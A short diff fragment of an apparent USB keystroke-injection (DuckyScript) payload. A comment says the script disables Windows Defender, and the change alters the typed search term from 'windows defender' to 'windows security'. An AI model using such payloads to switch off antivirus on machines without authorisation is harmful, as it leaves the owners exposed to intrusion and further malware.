@@ -9,7 +9,7 @@ DELAY 1000
 REM disable windows defender, you may have to fiddle with this 
 CTRL ESC
 DELAY 300
-STRING windows defender
+STRING windows security
 DELAY 300
 ENTER
 DELAY 1000
